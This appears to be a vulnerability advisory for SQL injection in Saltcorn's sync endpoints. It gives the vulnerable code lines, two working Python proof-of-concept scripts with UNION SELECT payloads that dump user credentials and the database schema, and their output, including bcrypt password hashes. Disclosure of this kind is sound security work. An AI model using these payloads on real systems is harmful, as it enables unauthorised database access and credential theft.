summary: "Saltcorn: SQL Injection via Unparameterized Sync Endpoints (maxLoadedId)\n## Summary\n\
  Saltcorn's mobile-sync routes (`POST /sync/load_changes` and `POST /sync/deletes`) interpolate\
  \ user-controlled values directly into SQL template literals without parameterization, type-casting,\
  \ or sanitization. Any authenticated user (role_id ≥ 80, the default \"user\" role) who has\
  \ read access to at least one table can inject arbitrary SQL, exfiltrate the entire database\
  \ including admin password hashes, enumerate all table schemas, and—on a PostgreSQL-backed\
  \ instance—execute write or DDL operations.\n\n## Details\n### Vulnerable code paths\n\n**Primary:\
  \ `packages/server/routes/sync.js` — `getSyncRows()` function**\n\n```js\n// Line 68 — maxLoadedId\
  \ branch (no syncFrom)\nwhere data_tbl.\"${db.sqlsanitize(pkName)}\" > ${syncInfo.maxLoadedId}\n\
  \n// Line 100 — maxLoadedId branch (with syncFrom)\nand info_tbl.ref > ${syncInfo.maxLoadedId}\n\
  ```\n\n`syncInfo` is taken verbatim from `req.body.syncInfos[tableName]`. There is no `parseInt()`,\
  \ `isFinite()`, or parameterized binding applied to `maxLoadedId` before it is embedded into\
  \ the SQL string passed to `db.query()`.\n\n`db.sqlsanitize()` is used elsewhere in the same\
  \ query to quote *identifiers* (table and column names) — a correct use — but is never applied\
  \ to *values*, and would not prevent injection anyway because it only escapes double-quote\
  \ characters.\n\n**Variant H1-V2: `packages/server/routes/sync.js` — `getDelRows()` function\
  \ (lines 173–190)**\n\n```js\n// Lines 182-183 — syncUntil and syncFrom come from req.body.syncTimestamp\
  \ / syncFrom where alias.max < to_timestamp(${syncUntil.valueOf() / 1000.0})   and alias.max\
  \ > to_timestamp(${syncFrom.valueOf() / 1000.0})\n```\n\n`syncUntil = new Date(syncTimestamp)`\
  \ where `syncTimestamp` comes from `req.body`. The resulting `.valueOf() / 1000.0` is still\
  \ interpolated as a raw numeric expression.\n\n**Route handler: lines 113–170 (`/load_changes`)**\n\
  \n```js\nrouter.post(\n  \"/load_changes\",\n  loggedIn,           // <-- only authentication\
  \ check; no input validation\n  error_catcher(async (req, res) => {\n    const { syncInfos,\
  \ loadUntil } = req.body || {};\n    ...\n    // syncInfos[tblName].maxLoadedId is passed\
  \ directly into getSyncRows\n```\n\n## PoC\nPlease find the attached script to dump the user's\
  \ DB using a normal user account.\n\n### Dumping users table\n```python\n#!/usr/bin/env python3\n\
  import requests\nimport json\nimport re\n\nBASE = \"http://localhost:3000\"\nEMAIL = \"ccx@ccx.com\"\
  \nPASSWORD = \"Abcd1234!\"\n\ns = requests.Session()\n\nprint(\"[*] Fetching login page...\"\
  )\nr = s.get(f\"{BASE}/auth/login\")\nmatch = re.search(r'_sc_globalCsrf = \"([^\"]+)\"',\
  \ r.text)\ncsrf_login = match.group(1)\n\nprint(\"[*] Logging in...\")\nr = s.post(f\"{BASE}/auth/login\"\
  , json={\"email\": EMAIL, \"password\": PASSWORD, \"_csrf\": csrf_login})\n\nprint(\"[*] Extracting\
  \ authenticated CSRF token...\")\nr = s.get(f\"{BASE}/\")\nmatch = re.search(r'_sc_globalCsrf\
  \ = \"([^\"]+)\"', r.text)\ncsrf = match.group(1)\n\nprint(\"[*] Dumping users...\")\npayload\
  \ = \"999 UNION SELECT 1,email,password,CAST(role_id AS TEXT),CAST(id AS TEXT) FROM users--\"\
  \nbody = {\"syncInfos\": {\"notes\": {\"maxLoadedId\": payload}}, \"loadUntil\": \"2030-01-01\"\
  }\nheaders = {\"CSRF-Token\": csrf, \"Content-Type\": \"application/json\"}\n\nr = s.post(f\"\
  {BASE}/sync/load_changes\", json=body, headers=headers)\n\nif r.status_code == 200:\n    print(json.dumps(r.json(),\
  \ indent=2))\nelse:\n    print(f\"Failed: {r.status_code}\")\n```\n\nOutput:\n\n```bash\n\
  (dllm) dllm@dllm:~/Downloads/saltcorn/artifacts/scripts$ python poc_h1_sqli_minimal.py\n[*]\
  \ Fetching login page...\n[*] Logging in...\n[*] Extracting authenticated CSRF token...\n\
  [*] Dumping users...\n{\n  \"notes\": {\n    \"rows\": [\n      {\n        \"_sync_info_tbl_ref_\"\
  : \"1\",\n        \"_sync_info_tbl_last_modified_\": \"admin@admin.com\",\n        \"_sync_info_tbl_deleted_\"\
  : \"$2a$10$BiEwZkMIpaBrj5yySQhbVuObOp5bpPpfxZYZDtV.VCTv.UxfI7o.6\",\n        \"id\": \"1\"\
  ,\n        \"owner_id\": \"1\"\n      },\n      {\n        \"_sync_info_tbl_ref_\": \"80\"\
  ,\n        \"_sync_info_tbl_last_modified_\": \"ccx@ccx.com\",\n        \"_sync_info_tbl_deleted_\"\
  : \"$2a$10$B0WWDy27n1H5D6M0.drOfOlCfp39jcsmk2Ueopx6R3SUwDV/ii0Hm\",\n        \"id\": \"80\"\
  ,\n        \"owner_id\": \"2\"\n      }\n    ],\n    \"maxLoadedId\": \"80\"\n  }\n}\n```\n\
  \n### Dumping schema\nUse the following script below to dump the schema: \n\n```python\n#!/usr/bin/env\
  \ python3\nimport requests\nimport json\nimport re\n\nBASE = \"http://localhost:3000\"\nEMAIL\
  \ = \"ccx@ccx.com\"\nPASSWORD = \"Abcd1234!\"\n\ns = requests.Session()\n\nprint(\"[*] Fetching\
  \ login page...\")\nr = s.get(f\"{BASE}/auth/login\")\nmatch = re.search(r'_sc_globalCsrf\
  \ = \"([^\"]+)\"', r.text)\ncsrf_login = match.group(1)\n\nprint(\"[*] Logging in...\")\n\
  r = s.post(f\"{BASE}/auth/login\", json={\"email\": EMAIL, \"password\": PASSWORD, \"_csrf\"\
  : csrf_login})\n\nprint(\"[*] Extracting authenticated CSRF token...\")\nr = s.get(f\"{BASE}/\"\
  )\nmatch = re.search(r'_sc_globalCsrf = \"([^\"]+)\"', r.text)\ncsrf = match.group(1)\n\n\
  print(\"[*] Enumerating database schema...\")\npayload = \"999 UNION SELECT 1,name,type,CAST(sql\
  \ AS TEXT),NULL FROM sqlite_master WHERE type='table'--\"\nbody = {\"syncInfos\": {\"notes\"\
  : {\"maxLoadedId\": payload}}, \"loadUntil\": \"2030-01-01\"}\nheaders = {\"CSRF-Token\":\
  \ csrf, \"Content-Type\": \"application/json\"}\n\nr = s.post(f\"{BASE}/sync/load_changes\"\
  , json=body, headers=headers)\n\nif r.status_code == 200:\n    print(json.dumps(r.json(),\
  \ indent=2))\nelse:\n    print(f\"HTTP {r.status_code}: {r.text[:500]}\")\n```\n\nOutput:\n\
  \n```bash\n(dllm) dllm@dllm:~/Downloads/saltcorn/artifacts/scripts$ python poc_h1_schema_enum.py\
  \ \n[*] Fetching login page...\n[*] Logging in...\n[*] Extracting authenticated CSRF token...\n\
  [*] Enumerating database schema...\n{\n  \"notes\": {\n    \"rows\": [\n      {\n        \"\
  _sync_info_tbl_ref_\": \"CREATE TABLE \\\"notes\\\" (id integer primary key, owner_id INTEGER)\"\
  ,\n        \"_sync_info_tbl_last_modified_\": \"notes\",\n        \"_sync_info_tbl_deleted_\"\
  : \"table\",\n        \"id\": \"CREATE TABLE \\\"notes\\\" (id integer primary key, owner_id\
  \ INTEGER)\",\n        \"owner_id\": null\n      },\n<SNIP>\n    \"maxLoadedId\": \"CREATE\
  \ TABLE users (\\n      id integer primary key,      \\n      email VARCHAR(128) not null\
  \ unique,\\n      password VARCHAR(60),\\n      role_id integer not null references _sc_roles(id)\\\
  n    , reset_password_token text, reset_password_expiry timestamp, \\\"language\\\" text,\
  \ \\\"disabled\\\" boolean not null default false, \\\"api_token\\\" text, \\\"_attributes\\\
  \" json, \\\"verification_token\\\" text, \\\"verified_on\\\" timestamp, last_mobile_login\
  \ timestamp)\"\n  }\n}\n```\n\n## Impact\n- **Confidentiality: CRITICAL** — Attacker reads\
  \ the entire database: all user credentials (bcrypt hashes), configuration secrets including\
  \ `_sc_config`, all user-created data, and the full schema.\n- **Integrity: CRITICAL** — On\
  \ PostgreSQL the same endpoint can execute INSERT/UPDATE/DELETE/DROP. On SQLite, multiple-statement\
  \ injection may be possible depending on driver configuration.\n- **Availability: CRITICAL**\
  \ — Attacker can DROP tables or corrupt the database.\n- **Scope: Changed** — Any authenticated\
  \ user (role_id=80) can access admin-tier data and beyond.\n- **Privilege escalation** — Admin\
  \ password hashes are exfiltrated; offline cracking of weak passwords grants admin access."
